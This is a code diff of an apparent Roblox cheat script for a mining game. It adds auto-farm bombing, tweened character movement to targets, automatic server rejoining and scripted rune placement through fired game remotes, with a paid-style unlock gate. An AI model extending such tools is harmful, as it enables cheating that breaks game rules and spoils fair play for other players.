+		return false
+	end
+
+	if bombTool and not State.EquipSpecificTool(bombTool) then
+		setStatus("Could not equip ClassicBomb", Theme.Bad)
+		State.LastDigToolEquipAttemptTick = -1000000000
+		State.EnsureDigToolEquipped()
+		return false
+	end
+
+	if not bombTool then
+		setStatus("ClassicBomb not found", Theme.Bad)
+		State.LastDigToolEquipAttemptTick = -1000000000
+		State.EnsureDigToolEquipped()
+		return false
+	end
+
+	task.wait(0.05)
+	local ok = pcall(function()
+		remote:FireServer("ClassicBomb")
+	end)
+	task.wait(0.08)
+	State.LastDigToolEquipAttemptTick = -1000000000
+	State.EnsureDigToolEquipped()
+
+	if ok then
+		setStatus("Rune farm bomb -> " .. State.GetDigBoulderDisplayName(target), Theme.Good)
+	else
+		setStatus("ClassicBomb activate failed", Theme.Bad)
+	end
+
+	return ok
 end
 
 function State.EnsureDigToolEquipped()
@@ -4881,6 +5250,44 @@ function State.UpdateBoulderLevelFarmButton()
 	end
 end
 
+function State.UpdateBoulderLevelFarmBombButton()
+	if not UI.BoulderLevelFarmBombButton then
+		return
+	end
+
+	if not State.IsLockedScriptUnlocked() then
+		UI.BoulderLevelFarmBombButton.Text = "BOMB LOCK"
+		UI.BoulderLevelFarmBombButton.BackgroundColor3 = Theme.ButtonDark
+		return
+	end
+
+	if State.BoulderLevelFarmBombEnabled then
+		UI.BoulderLevelFarmBombButton.Text = "BOMB ON"
+		UI.BoulderLevelFarmBombButton.BackgroundColor3 = Theme.Good
+	else
+		UI.BoulderLevelFarmBombButton.Text = "BOMB OFF"
+		UI.BoulderLevelFarmBombButton.BackgroundColor3 = Theme.ButtonDark
+	end
+end
+
+function State.SetBoulderLevelFarmBombEnabled(enabled, persist)
+	if enabled == true and not State.IsLockedScriptUnlocked() then
+		State.BoulderLevelFarmBombEnabled = false
+		Config.BoulderLevelFarmBombEnabled = false
+		State.UpdateBoulderLevelFarmBombButton()
+		return State.ShowLockedScriptMessage()
+	end
+
+	State.BoulderLevelFarmBombEnabled = enabled == true
+	Config.BoulderLevelFarmBombEnabled = State.BoulderLevelFarmBombEnabled
+	State.UpdateBoulderLevelFarmBombButton()
+	setStatus(State.BoulderLevelFarmBombEnabled and "Rune farm bomb ON" or "Rune farm bomb OFF", State.BoulderLevelFarmBombEnabled and Theme.Good or Theme.Muted)
+	if persist ~= false then
+		State.SaveConfig()
+	end
+	return State.BoulderLevelFarmBombEnabled
+end
+
 function State.SetBoulderLevelFarmLevel(level, persist, selected)
 	if not State.IsLockedScriptUnlocked() then
 		return State.ShowLockedScriptMessage()
@@ -4914,6 +5321,7 @@ function State.SetBoulderLevelFarmLevel(level, persist, selected)
 	State.BoulderHopNoTargetSince = nil
 	State.LastBoulderHopTick = 0
 	State.BoulderRejoinNoTargetSince = nil
+	State.BoulderRejoinDigErrorSince = nil
 	State.LastBoulderRejoinTick = 0
 	State.UpdateBoulderLevelDropdownText()
 	if persist ~= false then
@@ -5054,7 +5462,24 @@ function State.GetNextBoulderLevelFarmTarget()
 	return nearestTarget or fallbackTarget
 end
 
-function State.TweenBoulderLevelFarmToPosition(position)
+function State.GetBoulderLevelFarmTweenInterruptTarget(currentTarget)
+	if not State.BoulderLevelFarmEnabled then
+		return nil
+	end
+
+	local target = State.GetNextBoulderLevelFarmTarget()
+	if not target then
+		return nil
+	end
+
+	if currentTarget and target == currentTarget and currentTarget.Parent and State.IsBoulderLevelFarmMatch(currentTarget) then
+		return nil
+	end
+
+	return target
+end
+
+function State.TweenBoulderLevelFarmToPosition(position, currentTarget)
 	if not State.BoulderLevelFarmEnabled then
 		return false
 	end
@@ -5075,13 +5500,37 @@ function State.TweenBoulderLevelFarmToPosition(position)
 		{ CFrame = CFrame.new(position, position + root.CFrame.LookVector) }
 	)
 
+	local playbackState = nil
+	local completed = false
+	local interruptTarget = nil
+	local completedConnection = tween.Completed:Connect(function(state)
+		playbackState = state
+		completed = true
+	end)
+
 	State.BoulderLevelFarmTween = tween
 	tween:Play()
-	local playbackState = tween.Completed:Wait()
+
+	while State.BoulderLevelFarmEnabled and State.BoulderLevelFarmTween == tween and not completed do
+		interruptTarget = State.GetBoulderLevelFarmTweenInterruptTarget(currentTarget)
+		if interruptTarget then
+			pcall(function()
+				tween:Cancel()
+			end)
+			break
+		end
+
+		task.wait(Config.BoulderLevelFarmTweenInterval or 0.1)
+	end
+
+	if completedConnection then
+		completedConnection:Disconnect()
+	end
+
 	if State.BoulderLevelFarmTween == tween then
 		State.BoulderLevelFarmTween = nil
 	end
-	return State.BoulderLevelFarmEnabled and playbackState == Enum.PlaybackState.Completed
+	return State.BoulderLevelFarmEnabled and playbackState == Enum.PlaybackState.Completed, interruptTarget
 end
 
 function State.PrimeBoulderLevelFarmRoute()
@@ -5093,19 +5542,36 @@ function State.PrimeBoulderLevelFarmRoute()
 	if not root then
 		return false
 	end
-	if not State.TweenBoulderLevelFarmToPosition(root.Position + Vector3.new(0, Config.BoulderLevelFarmUpDistance or 300, 0)) then
+	State.BoulderLevelFarmRouteTweening = true
+	local reachedPosition, interruptTarget = State.TweenBoulderLevelFarmToPosition(root.Position + Vector3.new(0, Config.BoulderLevelFarmUpDistance or 300, 0))
+	if interruptTarget then
+		State.BoulderLevelFarmPrimed = true
+		State.BoulderLevelFarmRouteTweening = false
+		return true
+	end
+	if not reachedPosition then
+		State.BoulderLevelFarmRouteTweening = false
 		return false
 	end
 
 	_, root = getCharacterParts(LocalPlayer)
 	if not root then
+		State.BoulderLevelFarmRouteTweening = false
 		return false
 	end
-	if not State.TweenBoulderLevelFarmToPosition(root.Position + (root.CFrame.LookVector * (Config.BoulderLevelFarmForwardDistance or 1800))) then
+	reachedPosition, interruptTarget = State.TweenBoulderLevelFarmToPosition(root.Position + (root.CFrame.LookVector * (Config.BoulderLevelFarmForwardDistance or 1800)))
+	if interruptTarget then
+		State.BoulderLevelFarmPrimed = true
+		State.BoulderLevelFarmRouteTweening = false
+		return true
+	end
+	if not reachedPosition then
+		State.BoulderLevelFarmRouteTweening = false
 		return false
 	end
 
 	State.BoulderLevelFarmPrimed = true
+	State.BoulderLevelFarmRouteTweening = false
 	return true
 end
 
@@ -5114,7 +5580,7 @@ function State.TweenBoulderLevelFarmToTarget(target)
 		return false
 	end
 
-	return State.TweenBoulderLevelFarmToPosition(State.GetBoulderLevelFarmPosition(target))
+	return State.TweenBoulderLevelFarmToPosition(State.GetBoulderLevelFarmPosition(target), target)
 end
 
 function State.RunBoulderLevelFarmLoop()
@@ -5134,7 +5600,22 @@ function State.RunBoulderLevelFarmLoop()
 						State.EnsureDigToolEquipped()
 					end
 					setStatus("Tween to " .. State.GetDigBoulderDisplayName(target), Theme.Muted)
-					State.TweenBoulderLevelFarmToTarget(target)
+					local reachedTarget, interruptTarget = State.TweenBoulderLevelFarmToTarget(target)
+					if interruptTarget then
+						target = interruptTarget
+						State.BoulderLevelFarmTarget = target
+						State.SetDigBoulderTarget(target, false)
+						setStatus("Tween to " .. State.GetDigBoulderDisplayName(target), Theme.Muted)
+						reachedTarget = false
+					end
+					if reachedTarget
+						and State.BoulderLevelFarmBombEnabled
+						and State.BoulderLevelFarmEnabled
+						and State.GetSelectedDigBoulderTarget() == target
+						and target.Parent then
+						task.wait(1)
+						State.UseBoulderLevelFarmBomb(target)
+					end
 					while State.BoulderLevelFarmEnabled and State.GetSelectedDigBoulderTarget() == target and target.Parent and State.IsBoulderLevelFarmMatch(target) do
 						if State.EnsureDigToolEquipped then
 							State.EnsureDigToolEquipped()
@@ -5165,7 +5646,13 @@ function State.RunBoulderLevelFarmLoop()
 							end
 						end
 
-						if not State.TweenBoulderLevelFarmToPosition(position) and not State.BoulderLevelFarmEnabled then
+						local reachedPosition, interruptTarget = State.TweenBoulderLevelFarmToPosition(position, target)
+						if interruptTarget then
+							target = interruptTarget
+							State.BoulderLevelFarmTarget = target
+							State.SetDigBoulderTarget(target, false)
+							setStatus("Tween to " .. State.GetDigBoulderDisplayName(target), Theme.Muted)
+						elseif not reachedPosition and not State.BoulderLevelFarmEnabled then
 							break
 						end
 
@@ -5217,6 +5704,7 @@ function State.SetBoulderLevelFarmEnabled(enabled, persist)
 
 	State.BoulderLevelFarmEnabled = enabled == true
 	if not State.BoulderLevelFarmEnabled then
+		State.BoulderLevelFarmRouteTweening = false
 		if State.BoulderLevelFarmTween then
 			pcall(function()
 				State.BoulderLevelFarmTween:Cancel()
@@ -5231,6 +5719,9 @@ function State.SetBoulderLevelFarmEnabled(enabled, persist)
 		if State.BoulderTeleporting then
 			setBoulderTeleporting(false, false)
 		end
+		State.BoulderRejoinNoTargetSince = nil
+		State.BoulderRejoinDigErrorSince = nil
+		State.BoulderLevelFarmRouteTweening = false
 		State.BoulderLevelFarmPrimed = false
 		State.RunBoulderLevelFarmLoop()
 	end
@@ -5313,6 +5804,7 @@ function State.SetBoulderRejoinEnabled(enabled, persist)
 		State.BoulderRejoinEnabled = false
 		State.BoulderRejoining = false
 		State.BoulderRejoinNoTargetSince = nil
+		State.BoulderRejoinDigErrorSince = nil
 		State.UpdateBoulderRejoinButton()
 		return State.ShowLockedScriptMessage()
 	end
@@ -5324,6 +5816,7 @@ function State.SetBoulderRejoinEnabled(enabled, persist)
 	State.BoulderRejoinEnabled = enabled == true
 	State.BoulderRejoining = false
 	State.BoulderRejoinNoTargetSince = nil
+	State.BoulderRejoinDigErrorSince = nil
 	State.LastBoulderRejoinTick = 0
 	State.UpdateBoulderRejoinButton()
 	setStatus(State.BoulderRejoinEnabled and "Rune empty rejoin ON" or "Rune empty rejoin OFF", State.BoulderRejoinEnabled and Theme.Good or Theme.Muted)
@@ -5469,35 +5962,107 @@ function State.RejoinCurrentServer()
 	return true
 end
 
+function State.HasTooFarDigNotification()
+	local playerGui = LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")
+	local explorerHud = playerGui and playerGui:FindFirstChild("ExplorerHud")
+	local notifications = explorerHud and explorerHud:FindFirstChild("Notifications")
+	local notif = notifications and notifications:FindFirstChild("Notif")
+	local textLabel = notif and notif:FindFirstChild("Text")
+	if not textLabel then
+		return false
+	end
+
+	local ok, text = pcall(function()
+		return textLabel.Text
+	end)
+	if not ok then
+		return false
+	end
+
+	text = tostring(text or "")
+	if text:find("Nothing to dig here", 1, true) == nil then
+		return false
+	end
+
+	local count = tonumber(text:match("[xX]%s*(%d+)"))
+	return count ~= nil and count >= 50
+end
+
 function State.TryBoulderEmptyRejoin()
 	if not State.BoulderRejoinEnabled or State.BoulderRejoining then
 		return
 	end
 
+	if State.BoulderLevelFarmEnabled and State.BoulderLevelFarmRouteTweening then
+		State.BoulderRejoinNoTargetSince = nil
+		State.BoulderRejoinDigErrorSince = nil
+		return
+	end
+
+	local rejoinDelay = tonumber(Config.BoulderRejoinDelay) or 5
+	local now = os.clock()
+	local hasDigError = State.HasTooFarDigNotification and State.HasTooFarDigNotification()
 	local matchingTargets = State.CountBoulderLevelFarmMatches()
+
 	if matchingTargets > 0 then
+		State.BoulderRejoinNoTargetSince = nil
+	else
+		if not State.BoulderRejoinNoTargetSince then
+			State.BoulderRejoinNoTargetSince = now
+			if not hasDigError then
+				setStatus(State.GetBoulderLevelSummary() .. " runes empty, waiting " .. tostring(rejoinDelay) .. "s before rejoin", Theme.Muted)
+			end
+		end
+	end
+
+	if hasDigError then
+		if not State.BoulderRejoinDigErrorSince then
+			State.BoulderRejoinDigErrorSince = now
+			setStatus("Nothing to dig here x100+, waiting " .. tostring(rejoinDelay) .. "s before rejoin", Theme.Muted)
+		end
+	else
+		State.BoulderRejoinDigErrorSince = nil
+	end
+
+	local rejoinReason = nil
+	if State.BoulderRejoinDigErrorSince and now - State.BoulderRejoinDigErrorSince >= rejoinDelay then
+		rejoinReason = "dig_error"
+	elseif State.BoulderRejoinNoTargetSince and now - State.BoulderRejoinNoTargetSince >= rejoinDelay then
+		rejoinReason = "empty"
+	end
+
+	if not rejoinReason then
+		return
+	end
+
+	hasDigError = State.HasTooFarDigNotification and State.HasTooFarDigNotification()
+	matchingTargets = State.CountBoulderLevelFarmMatches()
+
+	if rejoinReason == "dig_error" then
+		if not hasDigError then
+			State.BoulderRejoinDigErrorSince = nil
+			return
+		end
+	elseif matchingTargets > 0 then
 		State.BoulderRejoinNoTargetSince = nil
 		return
 	end
 
-	local now = os.clock()
-	if not State.BoulderRejoinNoTargetSince then
-		State.BoulderRejoinNoTargetSince = now
-		setStatus("No " .. State.GetBoulderLevelSummary() .. " rune, waiting before rejoin", Theme.Muted)
-		return
-	end
-	if now - State.BoulderRejoinNoTargetSince < (Config.BoulderHopEmptyDelay or 2) then
-		return
-	end
-
-	setStatus(State.GetBoulderLevelSummary() .. " runes empty, rejoining", Theme.Good)
+	State.BoulderRejoinNoTargetSince = nil
+	State.BoulderRejoinDigErrorSince = nil
+	local statusReason = rejoinReason == "dig_error" and "Nothing to dig here x100+" or (State.GetBoulderLevelSummary() .. " runes empty")
+	setStatus(statusReason .. ", rejoining", Theme.Good)
 	task.spawn(function()
 		local ok, result = pcall(function()
 			return State.RejoinCurrentServer()
 		end)
 		if not ok or result ~= true then
 			State.BoulderRejoining = false
-			State.BoulderRejoinNoTargetSince = os.clock()
+			if rejoinReason == "dig_error" then
+				State.BoulderRejoinDigErrorSince = os.clock()
+			else
+				State.BoulderRejoinNoTargetSince = os.clock()
+			end
 		end
 	end)
 end
@@ -5517,6 +6082,12 @@ end
 
 function State.BoulderRejoinHeartbeat()
 	if not State.BoulderRejoinEnabled then
+		return
+	end
+
+	if State.BoulderLevelFarmEnabled and State.BoulderLevelFarmRouteTweening then
+		State.BoulderRejoinNoTargetSince = nil
+		State.BoulderRejoinDigErrorSince = nil
 		return
 	end
 
@@ -5709,12 +6280,14 @@ function RuneDrop.SetSelected(itemName, selected)
 	State.SaveConfig()
 end
 
-function RuneDrop.UpdateAmount(value)
+function RuneDrop.UpdateAmount(value, persist)
 	local amount = math.floor(tonumber(value or UI.RuneAmountInput.Text) or State.RuneDropAmount or 1)
 	amount = math.max(1, amount)
 	State.RuneDropAmount = amount
 	UI.RuneAmountInput.Text = tostring(amount)
-	State.SaveConfig()
+	if persist ~= false then
+		State.SaveConfig()
+	end
 	return amount
 end
 
@@ -5740,6 +6313,17 @@ function State.RunePlace.SetSelected(itemName, selected)
 		State.RunePlace.UpdateDropdownText()
 	end
 	State.SaveConfig()
+end
+
+function State.RunePlace.UpdateAmount(value, persist)
+	local amount = math.floor(tonumber(value or UI.RunePlaceAmountInput.Text) or State.RunePlaceAmount or 1)
+	amount = math.max(1, amount)
+	State.RunePlaceAmount = amount
+	UI.RunePlaceAmountInput.Text = tostring(amount)
+	if persist ~= false then
+		State.SaveConfig()
+	end
+	return amount
 end
 
 local function getBombShopConfig()
@@ -6307,9 +6891,8 @@ updatePlayerDropdownText = function()
 	local player = getTeleportTargetPlayer()
 	if player then
 		PlayerDropdownButton.Text = "Player: " .. getPlayerDisplayName(player)
-	elseif State.SelectedTeleportPlayerName then
-		PlayerDropdownButton.Text = "Player left: " .. tostring(State.SelectedTeleportPlayerName)
 	else
+		State.ClearTeleportPlayerSelection(false)
 		PlayerDropdownButton.Text = "Select player"
 	end
 end
@@ -6599,20 +7182,20 @@ end
 function State.RunePlace.UpdateDropdownText()
 	local names = State.RunePlace.GetSelectedNames()
 	if #names == 0 then
-		UI.RunePlaceDropdownButton.Text = "Select Place Rune"
+		State.SetLocalizedText(UI.RunePlaceDropdownButton, "Select Place Rune")
 	elseif #names == 1 then
-		UI.RunePlaceDropdownButton.Text = "Place: " .. names[1]
+		State.SetLocalizedText(UI.RunePlaceDropdownButton, "Place: " .. names[1])
 	else
-		UI.RunePlaceDropdownButton.Text = ("Place Runes: %d selected"):format(#names)
+		State.SetLocalizedText(UI.RunePlaceDropdownButton, ("Place Runes: %d selected"):format(#names))
 	end
 end
 
 function State.RunePlace.UpdateToggleButton()
 	if State.AutoPlaceRunes then
-		UI.AutoPlaceRuneButton.Text = "AUTO PLACE ON"
+		State.SetLocalizedText(UI.AutoPlaceRuneButton, "AUTO PLACE ON")
 		UI.AutoPlaceRuneButton.BackgroundColor3 = Theme.Bad
 	else
-		UI.AutoPlaceRuneButton.Text = "AUTO PLACE OFF"
+		State.SetLocalizedText(UI.AutoPlaceRuneButton, "AUTO PLACE OFF")
 		UI.AutoPlaceRuneButton.BackgroundColor3 = Theme.Button
 	end
 end
@@ -8373,20 +8956,213 @@ function State.RunePlace.GetEvents()
 	return explorerHud and explorerHud:FindFirstChild("Events")
 end
 
-function State.RunePlace.GetPlotPosition()
-	local things = Workspace:FindFirstChild("Things")
-	local plots = things and things:FindFirstChild("Plots")
-	local slots = plots and plots:FindFirstChild("Slots")
-	local plot = slots and LocalPlayer and slots:FindFirstChild(LocalPlayer.Name)
-	local region = plot and plot:FindFirstChild("Region")
+State.RunePlace.Random = State.RunePlace.Random or Random.new()
+State.RunePlace.EdgePadding = State.RunePlace.EdgePadding or 8
+State.RunePlace.LuckColumnSpacing = State.RunePlace.LuckColumnSpacing or 2.45
+State.RunePlace.LuckRowSpacing = State.RunePlace.LuckRowSpacing or 1.95
+State.RunePlace.ManualDelay = State.RunePlace.ManualDelay or 0.14
+
+function State.RunePlace.GetToolFootprint(tool)
+	if not tool then
+		return nil
+	end
+
+	local ok, extents = pcall(function()
+		if tool:IsA("Tool") then
+			return tool:GetExtentsSize()
+		end
+		return nil
+	end)
+	if ok and typeof(extents) == "Vector3" then
+		return extents
+	end
+
+	local handle = tool:FindFirstChild("Handle")
+	if handle and handle:IsA("BasePart") then
+		return handle.Size
+	end
+
+	local part = tool:FindFirstChildWhichIsA("BasePart", true)
+	if part then
+		return part.Size
+	end
+
+	return nil
+end
+
+function State.RunePlace.IsLuckRune(itemName)
+	local lowerName = tostring(itemName or ""):lower()
+	return lowerName == "luck rune" or lowerName:find("luck", 1, true) ~= nil
+end
+
+function State.RunePlace.GetLuckAnchor(region, tool)
 	if not region then
 		return nil
 	end
 
-	local ok, position = pcall(function()
-		return region.Position
+	local ok, size = pcall(function()
+		return region.Size
 	end)
-	return ok and position or nil
+	if not ok or typeof(size) ~= "Vector3" then
+		return nil
+	end
+
+	local halfX = math.max((size.X * 0.5) - State.RunePlace.EdgePadding, 1)
+	local halfZ = math.max((size.Z * 0.5) - State.RunePlace.EdgePadding, 1)
+	local footprint = State.RunePlace.GetToolFootprint(tool)
+	local footprintX = footprint and math.max(tonumber(footprint.X) or 0, 0) or 0
+	local footprintZ = footprint and math.max(tonumber(footprint.Z) or 0, 0) or 0
+	local columnSpacing = math.max(footprintX + 0.85, State.RunePlace.LuckColumnSpacing)
+	local rowSpacing = math.max(footprintZ + 1.15, State.RunePlace.LuckRowSpacing)
+	local usableHalfX = math.max(halfX - (footprintX * 0.5) - 0.15, 1)
+	local usableHalfZ = math.max(halfZ - (footprintZ * 0.5) - 0.15, 1)
+	return {
+		StartX = -usableHalfX,
+		StartZ = -usableHalfZ,
+		Columns = math.max(1, math.floor((usableHalfX * 2) / columnSpacing) + 1),
+		ColumnSpacing = columnSpacing,
+		RowSpacing = rowSpacing,
+		HalfX = usableHalfX,
+		HalfZ = usableHalfZ,
+		FootprintX = footprintX,
+		FootprintZ = footprintZ
+	}
+end
+
+function State.RunePlace.GetClusterOffset(placeIndex)
+	local index = math.max(tonumber(placeIndex) or 1, 1) - 1
+	local columns = math.max(1, math.floor((State.RunePlace.LuckColumnSpacing > 0 and 74 / State.RunePlace.LuckColumnSpacing or 1)) + 1)
+	local row = math.floor(index / columns)
+	local column = index % columns
+	return column * State.RunePlace.LuckColumnSpacing, row * State.RunePlace.LuckRowSpacing
+end
+
+function State.RunePlace.GetPlot()
+	local things = Workspace:FindFirstChild("Things")
+	local plots = things and things:FindFirstChild("Plots")
+	local slots = plots and plots:FindFirstChild("Slots")
+	if not slots then
+		return nil
+	end
+
+	local player = LocalPlayer
+	if player then
+		local exactPlot = slots:FindFirstChild(player.Name)
+		if exactPlot and exactPlot:FindFirstChild("Region") then
+			return exactPlot
+		end
+
+		local lowerName = tostring(player.Name or ""):lower()
+		local lowerDisplayName = tostring(player.DisplayName or ""):lower()
+		for _, child in ipairs(slots:GetChildren()) do
+			if child:FindFirstChild("Region") then
+				local childName = tostring(child.Name or ""):lower()
+				if childName == lowerName
+					or (lowerDisplayName ~= "" and childName == lowerDisplayName)
+					or (lowerName ~= "" and childName:find(lowerName, 1, true)) then
+					return child
+				end
+			end
+		end
+	end
+
+	for _, child in ipairs(slots:GetChildren()) do
+		if child:FindFirstChild("Region") and child:FindFirstChild("PlacedRunes") then
+			return child
+		end
+	end
+
+	for _, child in ipairs(slots:GetChildren()) do
+		if child:FindFirstChild("Region") then
+			return child
+		end
+	end
+
+	return nil
+end
+
+function State.RunePlace.GetPlotRegion()
+	local plot = State.RunePlace.GetPlot()
+	local region = plot and plot:FindFirstChild("Region")
+	if region and region:IsA("BasePart") then
+		return plot, region
+	end
+
+	return plot, nil
+end
+
+function State.RunePlace.GetPlotPosition(itemName, placeIndex, totalCount, luckAnchor, tool)
+	local _, region = State.RunePlace.GetPlotRegion()
+	if not region then
+		return nil
+	end
+
+	local ok, size = pcall(function()
+		return region.Size
+	end)
+	if not ok or typeof(size) ~= "Vector3" then
+		return region.Position
+	end
+
+	local halfX = math.max((size.X * 0.5) - State.RunePlace.EdgePadding, 1)
+	local halfZ = math.max((size.Z * 0.5) - State.RunePlace.EdgePadding, 1)
+	local offsetX
+	local offsetZ
+
+	if State.RunePlace.IsLuckRune(itemName) then
+		if not luckAnchor then
+			luckAnchor = State.RunePlace.GetLuckAnchor(region, tool)
+		end
+
+		if luckAnchor then
+			local columns = math.max(1, tonumber(luckAnchor.Columns) or 1)
+			local columnSpacing = tonumber(luckAnchor.ColumnSpacing) or State.RunePlace.LuckColumnSpacing
+			local rowSpacing = tonumber(luckAnchor.RowSpacing) or State.RunePlace.LuckRowSpacing
+			local startX = tonumber(luckAnchor.StartX) or -halfX
+			local startZ = tonumber(luckAnchor.StartZ) or -halfZ
+			local index = math.max(tonumber(placeIndex) or 1, 1) - 1
+			local row = math.floor(index / columns)
+			local column = index % columns
+			if row % 2 == 1 then
+				column = columns - 1 - column
+			end
+			offsetX = startX + (column * columnSpacing)
+			offsetZ = startZ + (row * rowSpacing)
+		end
+	end
+
+	if offsetX == nil or offsetZ == nil then
+		offsetX = State.RunePlace.Random:NextNumber(-halfX, halfX)
+		offsetZ = State.RunePlace.Random:NextNumber(-halfZ, halfZ)
+	end
+
+	local clampHalfX = halfX
+	local clampHalfZ = halfZ
+	if State.RunePlace.IsLuckRune(itemName) and luckAnchor then
+		clampHalfX = math.max(tonumber(luckAnchor.HalfX) or clampHalfX, 1)
+		clampHalfZ = math.max(tonumber(luckAnchor.HalfZ) or clampHalfZ, 1)
+	end
+
+	if offsetX > clampHalfX then
+		offsetX = clampHalfX
+	elseif offsetX < -clampHalfX then
+		offsetX = -clampHalfX
+	end
+
+	if offsetZ > clampHalfZ then
+		offsetZ = clampHalfZ
+	elseif offsetZ < -clampHalfZ then
+		offsetZ = -clampHalfZ
+	end
+
+	local okPosition, position = pcall(function()
+		return region.CFrame:PointToWorldSpace(Vector3.new(offsetX, 0, offsetZ))
+	end)
+	if okPosition and typeof(position) == "Vector3" then
+		return position
+	end
+
+	return region.Position
 end
 
 function State.RunePlace.FindTool(itemName)
@@ -8395,6 +9171,91 @@ function State.RunePlace.FindTool(itemName)
 	local tool = character and character:FindFirstChild(itemName)
 		or backpack and backpack:FindFirstChild(itemName)
 	return tool and tool:IsA("Tool") and tool or nil
+end
+
+function State.RunePlace.UpdateManualButton()
+	if not UI.ManualPlaceRuneButton then
+		return
+	end
+
+	if State.RunePlaceManualRunning then
+		State.SetLocalizedText(UI.ManualPlaceRuneButton, "STOP PLACE")
+		UI.ManualPlaceRuneButton.BackgroundColor3 = Theme.Bad
+	else
+		State.SetLocalizedText(UI.ManualPlaceRuneButton, "PLACE RUNES")
+		UI.ManualPlaceRuneButton.BackgroundColor3 = Theme.Button
+	end
+end
+
+function State.RunePlace.PlaceSelectedItems(amount)
+	if State.RunePlaceManualRunning then
+		State.RunePlaceManualRunning = false
+		State.RunePlace.UpdateManualButton()
+		setStatus("Stopping Rune place...", Theme.Muted)
+		return 0
+	end
+
+	local names = State.RunePlace.GetSelectedNames()
+	if #names == 0 then
+		State.RunePlace.RefreshDropdownOptions()
+		UI.RunePlaceDropdownList.Visible = true
+		setStatus("Select Rune to place first", Theme.Muted)
+		return 0
+	end
+
+	local remote = State.RunePlace.GetRemote()
+	if not remote then
+		setStatus("PlotPlaceRequest not found", Theme.Bad)
+		return 0
+	end
+
+	local targetCount = State.RunePlace.UpdateAmount(amount)
+	local targetTotal = #names * targetCount
+	local placed = 0
+	State.RunePlaceManualRunning = true
+	State.RunePlace.UpdateManualButton()
+	setStatus(("Placing Rune 0/%d"):format(targetTotal), Theme.Muted)
+
+	for _, itemName in ipairs(names) do
+		local _, region = State.RunePlace.GetPlotRegion()
+		local anchorTool = State.RunePlace.FindTool(itemName)
+		local luckAnchor = State.RunePlace.IsLuckRune(itemName) and State.RunePlace.GetLuckAnchor(region, anchorTool) or nil
+		for placeIndex = 1, targetCount do
+			if not State.RunePlaceManualRunning then
+				break
+			end
+
+			local tool = State.RunePlace.FindTool(itemName)
+			if not tool then
+				break
+			end
+
+			local position = State.RunePlace.GetPlotPosition(itemName, placeIndex, targetCount, luckAnchor, tool)
+			if not position then
+				break
+			end
+
+			local ok = pcall(function()
+				remote:FireServer(itemName, position, 0, tool)
+			end)
+			if ok then
+				placed += 1
+				setStatus(("Placing Rune %d/%d"):format(placed, targetTotal), Theme.Good)
+			end
+
+			task.wait(State.RunePlace.ManualDelay or 0.14)
+		end
+
+		if not State.RunePlaceManualRunning then
+			break
+		end
+	end
+
+	State.RunePlaceManualRunning = false
+	State.RunePlace.UpdateManualButton()
+	State.RunePlace.RefreshDropdownOptions()
+	setStatus(("Placed Rune %d/%d"):format(placed, targetTotal), placed > 0 and Theme.Good or Theme.Bad)
+	return placed
 end
 
 function State.SetAutoPlaceRuneEnabled(enabled, persist)
@@ -8434,8 +9295,7 @@ function State.RunePlace.Heartbeat()
 
 	local events = State.RunePlace.GetEvents()
 	local remote = State.RunePlace.GetRemote()
-	local position = State.RunePlace.GetPlotPosition()
-	if not (events and remote and position) then
+	if not (events and remote) then
 		return
 	end
 
@@ -8448,7 +9308,8 @@ function State.RunePlace.Heartbeat()
 				local lastAttempt = State.RunePlacePending[itemName]
 				if not lastAttempt or now - lastAttempt >= (Config.RunePlaceRetryInterval or 1) then
 					local tool = State.RunePlace.FindTool(itemName)
-					if tool then
+					local position = tool and State.RunePlace.GetPlotPosition()
+					if tool and position then
 						local ok = pcall(function()
 							remote:FireServer(itemName, position, 0, tool)
 						end)
@@ -8521,12 +9382,13 @@ connect(Players.PlayerAdded, function()
 end)
 
 connect(Players.PlayerRemoving, function(player)
-	if State.SelectedTeleportPlayerUserId == player.UserId then
+	if State.SelectedTeleportPlayerUserId == player.UserId or State.SelectedTeleportPlayerName == player.Name then
 		if State.PlayerTeleporting then
 			State.PlayerTeleporting = false
 			updatePlayerTeleportButton()
 			setStatus("TP target left: " .. player.Name, Theme.Bad)
 		end
+		State.ClearTeleportPlayerSelection(true)
 		task.defer(updatePlayerDropdownText)
 	end
 
@@ -8540,7 +9402,7 @@ connect(CollapseButton.Activated, function()
 end)
 
 connect(UI.LanguageButton.Activated, function()
-	State.SetLanguage(State.Language == "EN" and "TH" or "EN")
+	State.SetLanguage(State.Language == "TH" and "EN" or "TH")
 end)
 
 connect(FilterTypeButton.Activated, function()
@@ -8589,6 +9451,10 @@ end)
 
 connect(UI.RuneAmountInput.FocusLost, function()
 	RuneDrop.UpdateAmount()
+end)
+
+connect(UI.RunePlaceAmountInput.FocusLost, function()
+	State.RunePlace.UpdateAmount()
 end)
 
 connect(FarmButton.Activated, function()
@@ -8668,6 +9534,24 @@ connect(UI.AutoPlaceRuneButton.Activated, function()
 	State.SetAutoPlaceRuneEnabled(not State.AutoPlaceRunes)
 end)
 
+connect(UI.ManualPlaceRuneButton.Activated, function()
+	FilterTypeList.Visible = false
+	WeightModeList.Visible = false
+	PlayerDropdownList.Visible = false
+	BoulderDropdownList.Visible = false
+	UI.RuneDropdownList.Visible = false
+	UI.DigBoulderDropdownList.Visible = false
+	UI.BoulderLevelDropdownList.Visible = false
+	BombDropdownList.Visible = false
+	UI.RadarDropdownList.Visible = false
+	UI.RunePlaceDropdownList.Visible = false
+	if State.RunePlaceManualRunning then
+		State.RunePlace.PlaceSelectedItems()
+	else
+		task.spawn(State.RunePlace.PlaceSelectedItems)
+	end
+end)
+
 connect(UI.RunePlaceDropdownButton.Activated, function()
 	FilterTypeList.Visible = false
 	WeightModeList.Visible = false
@@ -8684,34 +9568,38 @@ connect(UI.RunePlaceDropdownButton.Activated, function()
 	end
 end)
 
-for _, otherList in ipairs({
-	FilterTypeList,
-	WeightModeList,
-	PlayerDropdownList,
-	BoulderDropdownList,
-	UI.RuneDropdownList,
-	UI.DigBoulderDropdownList,
-	UI.BoulderLevelDropdownList,
-	BombDropdownList,
-	UI.RadarDropdownList
-}) do
-	connect(otherList:GetPropertyChangedSignal("Visible"), function()
-		if otherList.Visible then
-			UI.RunePlaceDropdownList.Visible = false
-		end
-	end)
-end
-
-for _, control in ipairs(Content:GetDescendants()) do
-	if control:IsA("TextButton")
-		and control ~= UI.RunePlaceDropdownButton
-		and control ~= UI.AutoPlaceRuneButton
-		and not control:IsDescendantOf(UI.RunePlaceDropdownList) then
-		connect(control.Activated, function()
-			UI.RunePlaceDropdownList.Visible = false
+function State.ConnectRunePlaceDropdownClosers()
+	for _, otherList in ipairs({
+		FilterTypeList,
+		WeightModeList,
